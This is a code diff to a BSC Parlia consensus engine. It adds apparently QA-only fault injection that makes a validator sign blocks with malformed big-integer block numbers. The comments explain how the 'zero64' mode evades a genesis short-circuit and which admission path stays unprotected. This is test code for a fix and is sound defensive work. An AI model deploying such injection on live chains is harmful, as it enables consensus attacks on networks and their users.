@@ -11,41 +11,61 @@ import (
 )
 
 // Fault injection for the big.Int -> uint64 truncation weakness around
-// Header.Number, exercised on the NORMAL miner block-production path only
-// (Prepare). NOT for production. Hard-disabled on mainnet/chapel regardless
-// of any switch.
+// Header.Number, on the NORMAL miner block-production path. NOT for production.
+// Hard-disabled on mainnet/chapel regardless of any switch.
 //
-// A byzantine validator, exactly at block-production time (Prepare, before
-// FinalizeAndAssemble/Seal run), inflates header.Number by exactly 2^64 so
-// that header.Number.Uint64() still equals the expected height (the low 64
-// bits are unchanged -- adding 2^64 never touches them), but the big.Int
-// itself is oversized (BitLen > 64, fails Header.SanityCheck's IsUint64()).
+// Two attack modes (env MALICIOUS_BIG_NUMBER_MODE):
 //
-// Because this happens BEFORE the seal signature is produced, the signature
-// is computed over, and is valid for, this inflated header -- unlike
-// tampering the header after sealing (which invalidates the signature and
-// gets caught by verifySeal's ecrecover mismatch instead of by any
-// number-shape check).
+//	add64  (default) -- in Prepare, header.Number += 2^64. Uint64() is
+//	                    preserved (== real height H), the big.Int is >64-bit.
+//	                    Reaches verifyCascadingFields' post-genesis checks; a
+//	                    parent-continuity diff check (header.Number-parent==1
+//	                    in big.Int) CATCHES this.
 //
-// Scope note: this hook is intentionally mounted ONLY on Prepare (the local
-// miner path). The MEV BidBlock path (PrepareForBidBlock) is not injected.
+//	zero64          -- in Seal, right before signing, header.Number = H << 64.
+//	                    The low 64 bits are ZERO, so Uint64() == 0. This slips
+//	                    the `if number == 0 { return nil }` genesis short-circuit
+//	                    at the TOP of verifyCascadingFields, so any parent-
+//	                    continuity check placed AFTER that short-circuit is
+//	                    UNREACHABLE for this block -- i.e. it escapes that fix.
+//	                    (On the full sync path verifySeal's own number==0 guard
+//	                    still rejects with errUnknownBlock; the truly uncovered
+//	                    path is a standalone VerifyUnsealedHeader with no
+//	                    verifySeal, e.g. MEV BidBlock admission. A proper fix is
+//	                    an early !Number.IsUint64() reject before any Uint64().)
+//
+// Injection happens BEFORE the seal signature is produced, so the signature is
+// valid for the malformed header (a validly-signed malformed block, not a
+// post-seal tamper that verifySeal's ecrecover would catch).
+//
+// zero64 injection point is INSIDE Seal (not Prepare): Seal's top guard
+// `header.Number.Uint64() == 0 -> errUnknownBlock`, its snapshot(number-1)
+// lookup, delay and vote-attestation all run first on the REAL height H; only
+// the final signed header carries H<<64. Injecting H<<64 back in Prepare would
+// make the byzantine node fail to seal its own block.
+//
+// Scope: mounted only on the local miner path (Prepare + Seal). The MEV
+// BidBlock path (PrepareForBidBlock) is not injected.
 
-// injectBigBlockNumberEnv controls the injection. NOTE the inverted, default-ON
-// semantics: injection is ON unless this env var is exactly "2".
-//
-//	unset / "" / "1" / anything-but-"2"  -> injection ENABLED (default)
-//	"2"                                  -> injection DISABLED
-const injectBigBlockNumberEnv = "MALICIOUS_BIG_NUMBER"
+const (
+	// injectBigBlockNumberEnv is the master switch. Inverted, default-ON
+	// semantics: injection is ON unless this env var is exactly "2".
+	//   unset / "" / "1" / anything-but-"2" -> ENABLED (default)
+	//   "2"                                  -> DISABLED
+	injectBigBlockNumberEnv = "MALICIOUS_BIG_NUMBER"
+	injectDisableValue      = "2"
 
-// injectDisableValue is the single env value that turns the injection OFF.
-const injectDisableValue = "2"
+	// injectModeEnv selects the attack shape.
+	injectModeEnv    = "MALICIOUS_BIG_NUMBER_MODE"
+	injectModeAdd64  = "add64"  // default: Prepare, Number += 2^64 (Uint64()==H)
+	injectModeZero64 = "zero64" // Seal, Number = H<<64 (Uint64()==0)
+)
 
-// injectionBuildTag is a build/version marker. It is printed once at engine
-// construction and once on the first Prepare so operators can confirm from the
-// logs that the RUNNING BINARY actually contains this fault-injection code
-// (guards against the "stale binary / not redeployed" trap). Bump it whenever
-// the injection behavior changes.
-const injectionBuildTag = "big-number-injection/v2 (default-ON, disable=MALICIOUS_BIG_NUMBER=2)"
+// injectionBuildTag is a build/version marker printed once at engine
+// construction and once on the first Prepare, so operators can confirm from the
+// logs that the RUNNING BINARY carries this code (guards against the stale-
+// binary trap). Bump it whenever the injection behavior changes.
+const injectionBuildTag = "big-number-injection/v3 (default-ON, disable=2, modes=add64|zero64)"
 
 var (
 	twoPow64    = new(big.Int).Lsh(big.NewInt(1), 64)
@@ -53,8 +73,8 @@ var (
 	prepareOnce sync.Once
 )
 
-// isProtectedChain reports whether the chain is one where injection must never
-// happen (BSC mainnet 56 / Chapel testnet 97), regardless of the env switch.
+// isProtectedChain reports whether injection must never happen (BSC mainnet 56
+// / Chapel testnet 97), regardless of the env switch.
 func (p *Parlia) isProtectedChain() bool {
 	if p.chainConfig == nil || p.chainConfig.ChainID == nil {
 		return false
@@ -63,20 +83,24 @@ func (p *Parlia) isProtectedChain() bool {
 		p.chainConfig.ChainID.Cmp(params.ChapelChainConfig.ChainID) == 0
 }
 
-// injectionEnabled resolves the current on/off decision and the env value that
-// produced it (returned for logging).
+// injectionEnabled resolves the on/off decision and the env value behind it.
 func (p *Parlia) injectionEnabled() (enabled bool, envValue string) {
 	envValue = os.Getenv(injectBigBlockNumberEnv)
 	if p.isProtectedChain() {
 		return false, envValue
 	}
-	// Default ON: disabled only when explicitly set to "2".
-	return envValue != injectDisableValue, envValue
+	return envValue != injectDisableValue, envValue // default ON
 }
 
-// logInjectionBanner prints the one-time build/version banner. Called from
-// New() (fires on every node, right after logging is configured) so operators
-// can confirm the running binary carries this code and see the resolved mode.
+// injectionMode returns the selected attack mode (default add64).
+func (p *Parlia) injectionMode() string {
+	if os.Getenv(injectModeEnv) == injectModeZero64 {
+		return injectModeZero64
+	}
+	return injectModeAdd64
+}
+
+// logInjectionBanner prints the one-time build/version+mode banner from New().
 func (p *Parlia) logInjectionBanner() {
 	bannerOnce.Do(func() {
 		enabled, envValue := p.injectionEnabled()
@@ -90,6 +114,7 @@ func (p *Parlia) logInjectionBanner() {
 			"protectedChain", p.isProtectedChain(),
 			"envVar", injectBigBlockNumberEnv,
 			"envValue", envValue,
+			"mode", p.injectionMode(),
 			"resolvedMode", modeString(enabled),
 			"disableWith", injectBigBlockNumberEnv+"="+injectDisableValue,
 		)
@@ -98,30 +123,28 @@ func (p *Parlia) logInjectionBanner() {
 
 func modeString(enabled bool) string {
 	if enabled {
-		return "ENABLED (will inflate header.Number by 2^64)"
+		return "ENABLED"
 	}
 	return "DISABLED (header untouched)"
 }
 
-// maybeInjectBigBlockNumber inflates header.Number by 2^64 in place when the
-// injection is enabled. Must be called from Prepare, before
-// FinalizeAndAssemble/Seal compute the seal signature, so the signature
-// remains valid for the inflated value.
+// maybeInjectBigBlockNumber is the Prepare hook. It performs the add64 attack
+// (Number += 2^64). In zero64 mode it is a no-op here (injection deferred to
+// Seal). Must run before FinalizeAndAssemble/Seal so the seal covers the value.
 func (p *Parlia) maybeInjectBigBlockNumber(header *types.Header) {
 	enabled, envValue := p.injectionEnabled()
+	mode := p.injectionMode()
 
-	// One-time confirmation, the first time the miner path actually reaches
-	// this hook: proves both "correct binary" and "block-production path hit".
 	prepareOnce.Do(func() {
 		log.Warn("BIG_NUMBER_INJECTION first Prepare reached (miner path is live)",
 			"buildTag", injectionBuildTag,
 			"resolvedMode", modeString(enabled),
+			"mode", mode,
 			"envValue", envValue,
 		)
 	})
 
 	if p.isProtectedChain() {
-		// Should never happen on a QA devnet; log loudly if it does.
 		log.Warn("BIG_NUMBER_INJECTION skipped: protected chain (mainnet/chapel), env ignored",
 			"chainID", p.chainConfig.ChainID)
 		return
@@ -132,15 +155,21 @@ func (p *Parlia) maybeInjectBigBlockNumber(header *types.Header) {
 			"number", headerNumberString(header))
 		return
 	}
+	if mode != injectModeAdd64 {
+		// zero64 injects in Seal, not here.
+		log.Info("BIG_NUMBER_INJECTION[add64] skipped in Prepare: mode is not add64",
+			"mode", mode, "number", headerNumberString(header))
+		return
+	}
 	if header.Number == nil {
-		log.Warn("BIG_NUMBER_INJECTION skipped: header.Number is nil")
+		log.Warn("BIG_NUMBER_INJECTION[add64] skipped: header.Number is nil")
 		return
 	}
 
 	origUint64 := header.Number.Uint64()
 	header.Number = new(big.Int).Add(header.Number, twoPow64)
 
-	log.Warn("BIG_NUMBER_INJECTION active: inflated header.Number beyond uint64",
+	log.Warn("BIG_NUMBER_INJECTION[add64] active: inflated header.Number by 2^64 (Uint64() preserved)",
 		"buildTag", injectionBuildTag,
 		"expectedHeight", origUint64,
 		"truncatedUint64", header.Number.Uint64(),
@@ -148,6 +177,36 @@ func (p *Parlia) maybeInjectBigBlockNumber(header *types.Header) {
 		"bigNumber", header.Number.String(),
 		"parentHash", header.ParentHash,
 		"coinbase", header.Coinbase,
+	)
+}
+
+// maybeInjectSealBlockNumber is the Seal hook for the zero64 attack. It must be
+// called inside Seal, AFTER the top-of-Seal number==0 guard / snapshot / delay
+// (which run on the real height H) and IMMEDIATELY BEFORE the seal signature is
+// computed, so the signature covers the malformed Number.
+//
+// It sets header.Number = H << 64: the low 64 bits become zero (Uint64() == 0),
+// so the block slips verifyCascadingFields' genesis short-circuit; the high
+// bits keep H so blocks at different heights stay distinct.
+func (p *Parlia) maybeInjectSealBlockNumber(header *types.Header) {
+	enabled, envValue := p.injectionEnabled()
+	if !enabled || p.injectionMode() != injectModeZero64 || header.Number == nil {
+		return
+	}
+	// H must be > 0 here (Seal's top guard already rejected number==0).
+	origHeight := new(big.Int).Set(header.Number)
+	header.Number = new(big.Int).Lsh(origHeight, 64) // H << 64 -> low 64 bits = 0
+
+	log.Warn("BIG_NUMBER_INJECTION[zero64] active: forced header.Number low 64 bits to zero (Uint64()==0)",
+		"buildTag", injectionBuildTag,
+		"realHeight", origHeight.String(),
+		"truncatedUint64", header.Number.Uint64(), // == 0
+		"isUint64", header.Number.IsUint64(),       // == false
+		"bitlen", header.Number.BitLen(),
+		"bigNumber", header.Number.String(),
+		"parentHash", header.ParentHash,
+		"coinbase", header.Coinbase,
+		"envValue", envValue,
 	)
 }
 
